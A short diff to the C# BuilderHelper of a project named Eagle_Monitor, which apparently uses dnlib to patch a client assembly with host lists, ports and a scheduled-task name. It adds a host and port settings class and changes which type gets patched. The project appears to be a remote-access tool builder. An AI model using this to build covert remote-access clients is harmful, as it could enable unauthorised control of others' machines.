@@ -1,6 +1,7 @@
 ﻿using dnlib.DotNet;
 using dnlib.DotNet.Emit;
 using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Windows.Forms;
@@ -15,6 +16,14 @@ namespace Eagle_Monitor.Helpers
 {
     class BuilderHelper
     {
+        public static BuilderSetting builderSetting;
+
+        public class BuilderSetting 
+        {
+            public List<string> hostBuilder { get; set; }
+            public List<int> hostPortBuilder { get; set; }
+        }
+
         public void Build(bool bits64, string HostsList, string taskName, string time)
         {
             ModuleDefMD asmDef;
@@ -57,7 +66,7 @@ namespace Eagle_Monitor.Helpers
             {
                 asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                 asmDef.Name = Path.GetFileName(AsmName);
-                if (type.Name == "Starting")
+                if (type.Name == "Utils")
                     foreach (MethodDef method in type.Methods)
                     {
                         if (method.Body == null) continue;
